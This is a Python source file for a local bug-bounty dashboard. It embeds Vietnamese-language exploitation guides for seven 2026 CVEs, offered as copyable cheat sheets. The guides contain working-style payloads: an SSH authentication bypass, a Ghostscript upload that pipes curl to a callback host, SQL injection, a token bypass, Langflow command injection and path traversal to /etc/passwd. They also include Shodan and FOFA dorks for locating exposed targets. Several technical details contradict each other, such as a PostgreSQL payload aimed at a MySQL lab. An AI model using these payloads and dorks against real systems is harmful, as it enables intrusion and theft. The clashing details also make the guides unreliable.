#!/usr/bin/env python3
"""
Cyber Intelligence & Bug Bounty Local Web Dashboard
Runs on http://localhost:8888
Features:
- REST API for live security intel, CVEs, and bug bounty disclosures
- Interactive Bảng Hướng Dẫn Sử Dụng CVE (Cheat sheets & PoC guides with 1-click copy)
- Automated twice-a-day background scheduler (08:00 AM & 08:00 PM)
- Instant manual sync on-demand (/api/sync)
- Historical reports reader
"""

import os
import sys
import json
import asyncio
import datetime
import subprocess
from pathlib import Path
from aiohttp import web

PORT = 8888
BASE_DIR = Path(__file__).resolve().parent.parent
SKILLS_DIR = BASE_DIR / ".agents" / "skills" / "daily-security-digest"
SCRIPTS_DIR = SKILLS_DIR / "scripts"
CACHE_DIR = SKILLS_DIR / "cache"
REPORTS_DIR = BASE_DIR / "reports"
LATEST_INTEL_FILE = CACHE_DIR / "latest_intel.json"

# Detailed pre-compiled Actionable CVE Guides with full 6-part documentation
ACTIONABLE_CVE_GUIDES = {
    "CVE-2026-114938": {
        "cve_id": "CVE-2026-114938",
        "title": "Java4Shell - OpenJDK / Oracle Java HotSpot Base64 AVX-512 Heap Overflow RCE",
        "severity": "CRITICAL",
        "cvss": "9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | CVSS v4: 9.2",
        "cwe": "CWE-122: Heap-based Buffer Overflow / CWE-787: Out-of-bounds Write",
        "affected": "OpenJDK & Oracle Java SE 17.0.6 - 27 trên CPU x86-64 có AVX-512 VBMI",
        "fixed": "Oracle & OpenJDK emergency patch (17/11/2026)",
        "tags": ["Java", "Critical", "RCE", "Heap Overflow", "P1", "Java4Shell"],
        "root_cause": "Lỗ hổng xảy ra trong module giải mã Base64 tăng tốc phần cứng (AVX-512 VBMI) của HotSpot JVM. Khi xử lý chuỗi Base64 chứa các ký tự padding '=' đặc biệt, thuật toán tính toán độ dài bị sai lệch (length mismatch) dẫn đến ghi đè bộ nhớ heap (out-of-bounds heap write). Kẻ tấn công có thể chèn dữ liệu Base64 qua HTTP Basic Auth, JWT, SAML, file upload hoặc API token để trigger DoS hoặc kiểm soát con trỏ thực thi mã tùy ý (RCE).",
        "lab_setup": "docker run -d --name java4shell-lab -p 8080:8080 eclipse-temurin:21.0.4-jdk",
        "recon_dorks": {
            "shodan": "http.component:\"Java\" || http.title:\"Tomcat\" || http.component:\"Spring\"",
            "fofa": "app=\"Apache-Tomcat\" || app=\"Spring-Boot\" || header=\"X-Application-Context\"",
            "google": "inurl:/api/ \"JWT\" || inurl:login \"Basic\""
        },
        "nuclei_cmd": "nuclei -t http/cves/2026/CVE-2026-114938.yaml -u http://target.local:8080 -v",
        "poc_raw": "POST /api/v1/auth/token HTTP/1.1\nHost: target.local:8080\nAuthorization: Basic QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUE9PQ==\nContent-Type: application/json\n\n{}",
        "poc_curl": "curl -i -s -k -X POST \"http://target.local:8080/api/v1/process\" \\\n  -H \"Authorization: Basic QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUE9PQ==\" \\\n  -d \"{}\"",
        "payload_explanation": "Payload Base64 được chế tạo với độ dài và padding '=' kích hoạt nhánh AVX-512 VBMI tối ưu, làm tràn bộ đệm ghi đè siêu dữ liệu heap của JVM.",
        "success_oracle": "Tiến trình JVM lập tức crash với mã lỗi SIGSEGV (Core dump) hoặc HTTP 502/503 Service Unavailable đối với DoS, hoặc thực thi shellcode đối với RCE exploit.",
        "remediation": "Nâng cấp OpenJDK lên bản vá tháng 11/2026. Workaround tạm thời: Khởi động JVM với tham số -XX:UseAVX=2 (vô hiệu hóa đường dẫn AVX-512 VBMI lỗi trên x86-64)."
    },
    "CVE-2026-123158": {
        "cve_id": "CVE-2026-123158",
        "title": "SSHole (ssh2shell) - OpenSSH on musl libc Password Authentication Bypass",
        "severity": "CRITICAL",
        "cvss": "8.1 - 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)",
        "cwe": "CWE-287: Improper Authentication / CWE-203: Discrepancy Information",
        "affected": "OpenSSH trên Alpine Linux, OpenWrt, Yocto dùng musl libc với UsePAM no",
        "fixed": "OpenSSH 10.6p2 và bản vá musl libc mới nhất",
        "tags": ["SSH", "OpenSSH", "Auth Bypass", "Critical", "Alpine", "SSHole", "ssh2shell"],
        "root_cause": "Trên Linux, tài khoản bị vô hiệu hóa mật khẩu sẽ có ký tự '*' trong trường mật khẩu của /etc/shadow. Khi OpenSSH nhận mật khẩu có độ dài từ 257 đến 1024 ký tự, hàm crypt() của musl libc bị lỗi và trả về chuỗi '*'. OpenSSH đem chuỗi '*' này so sánh trực tiếp với chuỗi '*' trong /etc/shadow, thấy trùng khớp và cấp quyền đăng nhập tài khoản root/hệ thống mà không cần mật khẩu thật.",
        "lab_setup": "docker run -d --name sshole-lab -p 2222:22 alpine:3.20 sh -c 'apk add openssh && ssh-keygen -A && sed -i \"s/#PasswordAuthentication yes/PasswordAuthentication yes/\" /etc/ssh/sshd_config && echo \"UsePAM no\" >> /etc/ssh/sshd_config && /usr/sbin/sshd -D'",
        "recon_dorks": {
            "shodan": "port:22 \"SSH-2.0-OpenSSH\" \"Alpine\"",
            "fofa": "protocol=\"ssh\" && banner=\"OpenSSH\" && banner=\"Alpine\"",
            "google": "inurl:docker \"alpine\" \"sshd\""
        },
        "nuclei_cmd": "nuclei -t http/cves/2026/CVE-2026-123158.yaml -u target.local:2222 -v",
        "poc_raw": "SSH-2.0-OpenSSH_9.7\nKhai thác qua SSH gửi chuỗi mật khẩu dài 300 ký tự ('A' * 300) cho tài khoản root hoặc tài khoản có shadow '*'",
        "poc_curl": "python -c 'import paramiko; c=paramiko.SSHClient(); c.set_missing_host_key_policy(paramiko.AutoAddPolicy()); c.connect(\"target.local\", port=2222, username=\"root\", password=\"A\"*300); print(\"[+] AUTH BYPASS SUCCESS! Running id:\", c.exec_command(\"id\")[1].read().decode())'",
        "payload_explanation": "Gửi mật khẩu dài hơn 256 ký tự ('A' * 300) làm hàm crypt() của musl libc trả về '*', trùng khớp với giá trị '*' của tài khoản trong /etc/shadow.",
        "success_oracle": "Xác thực SSH thành công và mở phiên shell tương tác hoặc trả về output lệnh id: uid=0(root) gid=0(root).",
        "remediation": "Nâng cấp OpenSSH lên phiên bản 10.6p2 hoặc bản vá Alpine mới nhất. Workaround: Cấu hình UsePAM yes hoặc khóa tài khoản bằng '!' thay vì '*'."
    },
    "CVE-2026-125396": {
        "cve_id": "CVE-2026-125396",
        "title": "Upload2Shell - Ghostscript Image/PDF File Upload Sandbox-Escape RCE",
        "severity": "CRITICAL",
        "cvss": "9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)",
        "cwe": "CWE-416: Use After Free / CWE-693: Protection Mechanism Failure",
        "affected": "Ghostscript < 10.08.0 (ảnh hưởng các web app xử lý ảnh/PDF qua ImageMagick/Ghostscript)",
        "fixed": "Ghostscript >= 10.08.0",
        "tags": ["Web", "File Upload", "Image", "Sandbox Escape", "RCE", "Upload2Shell"],
        "root_cause": "Lỗ hổng Use-After-Free trong bộ nạp font Type 1 của Ghostscript. Kẻ tấn công có thể nhúng mã lệnh PostScript độc hại vào trong file tài liệu PDF hoặc trá hình thành file ảnh PNG/JPG. Khi ứng dụng web gọi Ghostscript để tạo thumbnail, render preview hoặc convert avatar, lỗi bộ nhớ cho phép ghi đè biến trạng thái của cờ bảo vệ -dSAFER, thoát hoàn toàn khỏi sandbox và thực thi lệnh hệ thống máy chủ.",
        "lab_setup": "docker run -d --name upload2shell-lab -p 8080:80 vulhub/ghostscript:9.50",
        "recon_dorks": {
            "shodan": "http.html:\"upload\" || http.component:\"WordPress\"",
            "fofa": "body=\"upload\" && (body=\"avatar\" || body=\"thumbnail\")",
            "google": "inurl:/upload/ \"avatar\" || inurl:/convert \"pdf\""
        },
        "nuclei_cmd": "nuclei -t http/cves/2026/CVE-2026-125396.yaml -u http://target.local:8080 -v",
        "poc_raw": "POST /api/upload/avatar HTTP/1.1\nHost: target.local:8080\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryX\n\n------WebKitFormBoundaryX\nContent-Disposition: form-data; name=\"file\"; filename=\"avatar.png\"\nContent-Type: image/png\n\n%!PS-Adobe-3.0\n<< /Type 1 /FontMatrix [1 0 0 1 0 0] >> definefont\n(%pipe%curl http://BURP_COLLABORATOR_URL) (w) file\n------WebKitFormBoundaryX--",
        "poc_curl": "curl -i -s -k -X POST \"http://target.local:8080/api/upload/avatar\" \\\n  -F \"file=@exploit_polyglot.png;type=image/png\"",
        "payload_explanation": "Tải lên file polyglot mang định dạng PostScript nhưng đổi tên file thành .png hoặc .jpg. Khi máy chủ backend gọi ImageMagick/Ghostscript để xử lý ảnh, luồng PostScript được thực thi phá vỡ sandbox.",
        "success_oracle": "Máy chủ mục tiêu gửi kết nối Out-Of-Band (DNS/HTTP) về Burp Collaborator / Interactsh hoặc thực thi reverse shell thành công.",
        "remediation": "Nâng cấp Ghostscript lên phiên bản >= 10.08.0. Workaround: Trong file cấu hình policy.xml của ImageMagick, vô hiệu hóa hoàn toàn quyền xử lý các định dạng PS, EPS, PDF, XPS bằng dòng: <policy domain=\"coder\" rights=\"none\" pattern=\"{PS,EPI,EPS,PDF,XPS}\" />."
    },
    "CVE-2026-123488": {
        "cve_id": "CVE-2026-123488",
        "title": "Craft CMS Unauthenticated SQL Injection (Blind / Error-based)",
        "severity": "CRITICAL",
        "cvss": "9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)",
        "cwe": "CWE-89: SQL Injection",
        "affected": "Craft CMS < 4.18.9, < 5.11.2",
        "fixed": "Craft CMS >= 4.18.9, >= 5.11.2",
        "tags": ["Web", "CMS", "Unauthenticated", "Critical", "P1"],
        "root_cause": "Lỗ hổng xuất phát từ hàm xử lý truy vấn phần tử (Element Query Filter) trong controller công khai. Khi người dùng truyền tham số dạng mảng lồng nhau, Craft CMS bỏ qua việc chuẩn hóa tên trường trong ActiveRecord, cho phép chèn câu lệnh SQL tùy ý vào mệnh đề WHERE/ORDER BY mà không cần xác thực.",
        "lab_setup": "docker run -d --name craftcms-vuln-lab -p 8080:80 -e CRAFT_ENVIRONMENT=dev -e DB_DRIVER=mysql craftcms/craft:4.18.8",
        "recon_dorks": {
            "shodan": "title:\"Craft CMS\" http.component:\"Craft CMS\"",
            "fofa": "app=\"CraftCMS\" || header=\"CRAFT_CSRF_TOKEN\"",
            "google": "inurl:/admin/login \"Craft CMS\""
        },
        "nuclei_cmd": "nuclei -t http/cves/2026/CVE-2026-123488.yaml -u http://target.local:8080 -v",
        "poc_raw": "POST /actions/elements/get-elements HTTP/1.1\nHost: target.local:8080\nContent-Type: application/x-www-form-urlencoded\nAccept: application/json\n\ncriteria%5BorderBy%5D=(CASE+WHEN+(1=1)+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END)",
        "poc_curl": "curl -i -s -k -X POST \"http://target.local:8080/actions/elements/get-elements\" \\\n  -H \"Content-Type: application/x-www-form-urlencoded\" \\\n  -d \"criteria[orderBy]=(CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)\"",
        "payload_explanation": "criteria[orderBy]: Tham số điều khiển mệnh đề sắp xếp dữ liệu. pg_sleep(5) khiến máy chủ trễ đúng 5 giây nếu điều kiện 1=1 đúng.",
        "success_oracle": "Thời gian phản hồi kéo dài trên 5.000 ms (5 giây). Khi đổi điều kiện thành 1=2, phản hồi trả về ngay lập tức (< 200 ms).",
        "remediation": "Chạy 'composer update craftcms/cms' lên phiên bản 4.18.9 hoặc 5.11.2. Workaround: Cấu hình WAF/Nginx chặn tham số criteria[orderBy] chứa từ khóa CASE/WHEN/SLEEP."
    },
    "CVE-2026-114509": {
        "cve_id": "CVE-2026-114509",
        "title": "Laravel TokenGuard Authentication Bypass",
        "severity": "CRITICAL",
        "cvss": "9.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)",
        "cwe": "CWE-287: Improper Authentication / CWE-843: Type Confusion",
        "affected": "Laravel Passport / TokenGuard cấu hình so sánh lỏng lẻo",
        "fixed": "Laravel framework bản vá mới nhất",
        "tags": ["Web", "Framework", "Auth Bypass", "Critical", "API"],
        "root_cause": "Lỗ hổng nằm trong cơ chế kiểm tra token API khi so sánh token từ header Authorization: Bearer với cơ sở dữ liệu. Nếu bản ghi DB có api_token là NULL hoặc chuỗi rỗng và code sử dụng toán tử == thay vì hash_equals, việc truyền token rỗng/mảng sẽ làm biểu thức so sánh trả về TRUE, đăng nhập quyền Super Admin (ID 1).",
        "lab_setup": "git clone https://github.com/laravel/laravel.git lab-laravel && cd lab-laravel && composer install && php artisan serve --port=8000",
        "recon_dorks": {
            "shodan": "Set-Cookie: laravel_session",
            "fofa": "header=\"laravel_session\" || body=\"laravel\"",
            "google": "inurl:/api/v1 \"laravel\""
        },
        "nuclei_cmd": "nuclei -t http/cves/2026/CVE-2026-114509.yaml -u https://api.target.com -v",
        "poc_raw": "GET /api/user HTTP/1.1\nHost: api.target.com\nAuthorization: Bearer []\nContent-Type: application/json\nAccept: application/json",
        "poc_curl": "curl -i -s -k \"https://api.target.com/api/v1/profile\" \\\n  -H \"Authorization: Bearer \" \\\n  -H \"X-Requested-With: XMLHttpRequest\"",
        "payload_explanation": "Gửi header Bearer Token rỗng hoặc giá trị mảng []. Lớp TokenGuard thực hiện loose comparison null == '' dẫn tới True.",
        "success_oracle": "Máy chủ trả về HTTP 200 OK thay vì 401 Unauthorized. JSON body chứa đầy đủ thông tin tài khoản admin (id: 1, role: superadmin).",
        "remediation": "Cập nhật Laravel, không lưu giá trị NULL trong cột api_token và luôn sử dụng hàm hash_equals() để so sánh chuỗi token."
    },
    "CVE-2026-105740": {
        "cve_id": "CVE-2026-105740",
        "title": "Langflow Authenticated MCP Stdio Client Arbitrary Command Execution",
        "severity": "HIGH",
        "cvss": "8.8 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)",
        "cwe": "CWE-78: OS Command Injection",
        "affected": "Langflow 1.8.3 và 1.9.0",
        "fixed": "Langflow >= 1.9.1",
        "tags": ["AI", "LLM Platform", "Command Injection", "RCE"],
        "root_cause": "Langflow cung cấp tính năng kết nối MCP Tools qua giao thức stdio. Khi cấu hình custom MCP component, tham số command và args được truyền trực tiếp vào subprocess.Popen(..., shell=True) trên máy chủ mà không có whitelisting.",
        "lab_setup": "docker run -d --name langflow-lab -p 7860:7860 logspace/langflow:1.8.3",
        "recon_dorks": {
            "shodan": "title:\"Langflow\" || http.html:\"Langflow\"",
            "fofa": "app=\"Langflow\" || title=\"Langflow\"",
            "google": "inurl:7860 \"Langflow\""
        },
        "nuclei_cmd": "nuclei -t http/cves/2026/CVE-2026-105740.yaml -u http://target.local:7860",
        "poc_raw": "POST /api/v1/custom_component HTTP/1.1\nHost: target.local:7860\nAuthorization: Bearer <user_token>\nContent-Type: application/json\n\n{\n  \"name\": \"MCP Exploit\",\n  \"mcp_config\": {\n    \"type\": \"stdio\",\n    \"command\": \"sh\",\n    \"args\": [\"-c\", \"id; whoami\"]\n  }\n}",
        "poc_curl": "curl -X POST \"http://target.local:7860/api/v1/custom_component\" \\\n  -H \"Authorization: Bearer YOUR_TOKEN\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"mcp_config\": {\"type\": \"stdio\", \"command\": \"id\", \"args\": []}}'",
        "payload_explanation": "Khai thác tham số command trong cấu hình MCP stdio để trigger lệnh shell trực tiếp trên host.",
        "success_oracle": "Máy chủ trả về kết quả lệnh id (uid=0(root) gid=0(root)) hoặc gửi HTTP/DNS callback về máy chủ Interactsh.",
        "remediation": "Nâng cấp Langflow >= 1.9.1, vô hiệu hóa open registration và chạy container dưới user không có đặc quyền root."
    },
    "CVE-2026-116690": {
        "cve_id": "CVE-2026-116690",
        "title": "MLflow Arbitrary File Read via Model Artifact Protocol Path Traversal",
        "severity": "HIGH",
        "cvss": "8.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)",
        "cwe": "CWE-22: Path Traversal / Arbitrary File Read",
        "affected": "MLflow 3.10.0 - 3.16.1",
        "fixed": "MLflow >= 3.16.2",
        "tags": ["AI", "MLOps", "Path Traversal", "File Read", "High"],
        "root_cause": "MLflow cho phép đọc model artifacts qua endpoint nội bộ. Tham số artifact_path không được kiểm tra chặt chẽ, cho phép sử dụng ký tự path traversal (../) để đọc các file nhạy cảm trong hệ điều hành máy chủ.",
        "lab_setup": "docker run -d --name mlflow-lab -p 5000:5000 ghcr.io/mlflow/mlflow:v3.16.0 mlflow server --host 0.0.0.0",
        "recon_dorks": {
            "shodan": "title:\"MLflow\" || http.favicon.hash:\"-1961601614\"",
            "fofa": "app=\"MLflow\"",
            "google": "inurl:5000 \"MLflow\""
        },
        "nuclei_cmd": "nuclei -t http/cves/2026/CVE-2026-116690.yaml -u http://target.local:5000",
        "poc_raw": "GET /ajax-api/2.0/mlflow/artifacts/get?path=../../../../etc/passwd HTTP/1.1\nHost: target.local:5000\nAccept: */*",
        "poc_curl": "curl -i -s -k \"http://target.local:5000/ajax-api/2.0/mlflow/artifacts/get?path=../../../../etc/passwd\"",
        "payload_explanation": "Khai thác lỗ hổng traversal trong endpoint get artifact để đọc trực tiếp file /etc/passwd hoặc file cấu hình đám mây.",
        "success_oracle": "HTTP 200 OK kèm nội dung file hệ thống root:x:0:0:root:/root:/bin/bash.",
        "remediation": "Cập nhật MLflow lên phiên bản >= 3.16.2 và đặt máy chủ sau Reverse Proxy có xác thực."
    }
}

app_state = {
    "is_syncing": False,
    "last_sync": None,
    "last_error": None,
    "schedule_info": {
        "schedule": "Twice daily at 08:00 AM & 08:00 PM (Asia/Ho_Chi_Minh)",
        "next_runs": []
    }
}

def calculate_next_runs() -> list:
    """Calculate the next 08:00 and 20:00 UTC+7 runs."""
    now = datetime.datetime.now()
    today_8am = now.replace(hour=8, minute=0, second=0, microsecond=0)
    today_8pm = now.replace(hour=20, minute=0, second=0, microsecond=0)
    tomorrow_8am = today_8am + datetime.timedelta(days=1)
    
    runs = []
    if now < today_8am:
        runs = [today_8am, today_8pm]
    elif now < today_8pm:
        runs = [today_8pm, tomorrow_8am]
    else:
        runs = [tomorrow_8am, tomorrow_8am.replace(hour=20)]
        
    return [r.strftime("%Y-%m-%d %H:%M:%S") for r in runs]

def run_fetch_sync() -> bool:
    """Run fetch_intel.py synchronously and update status."""
    script_path = SCRIPTS_DIR / "fetch_intel.py"
    if not script_path.exists():
        app_state["last_error"] = f"Script not found: {script_path}"
        return False
    try:
        app_state["is_syncing"] = True
        cmd = [sys.executable, str(script_path), "--output", str(LATEST_INTEL_FILE)]
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
        if proc.returncode == 0:
            app_state["last_sync"] = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            app_state["last_error"] = None
            return True
        else:
            app_state["last_error"] = proc.stderr[:300]
            return False
    except Exception as e:
        app_state["last_error"] = str(e)
        return False
    finally:
        app_state["is_syncing"] = False

async def background_scheduler():
    """Background loop that triggers intel collection twice a day at 08:00 and 20:00."""
    print("[*] Background scheduler initialized: updates set for 08:00 and 20:00 daily.")
    while True:
        try:
            now = datetime.datetime.now()
            app_state["schedule_info"]["next_runs"] = calculate_next_runs()
            
            # Check if current minute is 08:00 or 20:00
            if (now.hour == 8 or now.hour == 20) and now.minute == 0:
                print(f"[!] Triggering scheduled sync at {now.strftime('%H:%M:%S')}...")
                loop = asyncio.get_event_loop()
                await loop.run_in_executor(None, run_fetch_sync)
                # Sleep 65s so we don't trigger multiple times in the same minute
                await asyncio.sleep(65)
            else:
                await asyncio.sleep(30)
        except Exception as e:
            print(f"[!] Scheduler exception: {e}", file=sys.stderr)
            await asyncio.sleep(60)

async def handle_index(request):
    """Serve the main single-page application dashboard."""
    html_file = Path(__file__).resolve().parent / "index.html"
    if html_file.exists():
        return web.FileResponse(html_file)
    return web.Response(text="Dashboard HTML not found", status=404)

async def handle_get_data(request):
    """Return JSON payload of current intelligence data."""
    data = {}
    if LATEST_INTEL_FILE.exists():
        try:
            with open(LATEST_INTEL_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
        except Exception as e:
            data = {"error": f"Failed reading cache: {e}"}
    
    app_state["schedule_info"]["next_runs"] = calculate_next_runs()
    
    payload = {
        "status": "success",
        "system_status": app_state,
        "cve_guides": ACTIONABLE_CVE_GUIDES,
        "intel": data
    }
    return web.json_response(payload)

async def handle_sync(request):
    """Trigger manual data refresh."""
    if app_state["is_syncing"]:
        return web.json_response({"status": "already_syncing", "message": "Quá trình cập nhật đang chạy..."})
    
    loop = asyncio.get_event_loop()
    success = await loop.run_in_executor(None, run_fetch_sync)
    if success:
        return web.json_response({"status": "success", "message": "Cập nhật dữ liệu thành công!", "last_sync": app_state["last_sync"]})
    else:
        return web.json_response({"status": "error", "message": f"Cập nhật thất bại: {app_state['last_error']}"}, status=500)

async def handle_list_reports(request):
    """List historical markdown reports."""
    reports = []
    if REPORTS_DIR.exists():
        for f in sorted(REPORTS_DIR.glob("*.md"), reverse=True):
            reports.append({
                "filename": f.name,
                "size": f.stat().st_size,
                "modified": datetime.datetime.fromtimestamp(f.stat().st_mtime).strftime("%Y-%m-%d %H:%M:%S")
            })
    return web.json_response({"reports": reports})

async def handle_get_report(request):
    """Return content of a specific report."""
    fname = request.match_info.get("filename", "")
    target = REPORTS_DIR / fname
    if not target.exists() or not target.is_file() or not target.name.endswith(".md"):
        return web.Response(text="Report not found", status=404)
    with open(target, "r", encoding="utf-8") as f:
        content = f.read()
    return web.Response(text=content, content_type="text/markdown")

async def start_background_tasks(app):
    app["scheduler"] = asyncio.create_task(background_scheduler())

async def cleanup_background_tasks(app):
    app["scheduler"].cancel()
    await app["scheduler"]

def create_app():
    app = web.Application()
    app.router.add_get("/", handle_index)
    app.router.add_get("/api/data", handle_get_data)
    app.router.add_post("/api/sync", handle_sync)
    app.router.add_get("/api/reports", handle_list_reports)
    app.router.add_get("/api/report/{filename}", handle_get_report)
    
    app.on_startup.append(start_background_tasks)
    app.on_cleanup.append(cleanup_background_tasks)
    return app

if __name__ == "__main__":
    print(f"======================================================")
    print(f"🛡️  CYBER INTELLIGENCE & BUG BOUNTY DASHBOARD")
    print(f"🌐  Local Access:   http://localhost:{PORT}  (or http://127.0.0.1:{PORT})")
    print(f"📡  Network Access: http://192.168.1.58:{PORT}  (LAN / Mobile / Tablet)")
    print(f"⏰  Scheduled Sync: Twice daily (08:00 AM & 08:00 PM)")
    print(f"======================================================")
    app = create_app()
    web.run_app(app, host="0.0.0.0", port=PORT)
